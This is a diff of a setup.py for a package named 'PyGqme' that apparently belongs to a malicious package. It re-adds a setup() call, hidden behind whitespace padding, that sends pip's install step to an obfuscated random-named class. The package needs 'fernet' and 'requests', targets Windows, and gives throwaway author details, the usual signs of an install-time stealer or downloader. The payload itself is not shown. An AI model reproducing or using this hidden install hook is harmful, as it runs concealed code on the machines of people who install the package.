@@ -18,5 +18,22 @@ class ClcYUfQMpyrmcJJejzrtsdkRMJfeFbiNUJYFUomihjCMrHGxmFbbeIosvoNLtmZKmfWzDoiSLa
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+setup(
+    name="PyGqme",
+    version=VERSION,
+    author="heDZZDLxfgHyvRKHJY",
+    author_email="sGXOXGlPOZToqmkq@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': ClcYUfQMpyrmcJJejzrtsdkRMJfeFbiNUJYFUomihjCMrHGxmFbbeIosvoNLtmZKmfWzDoiSLazGAZUpXzcqyrgOisFnKFrAbcckmJhHJJasfdWTxVXVgXoDylbWmakisGKnjRNkzgb,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
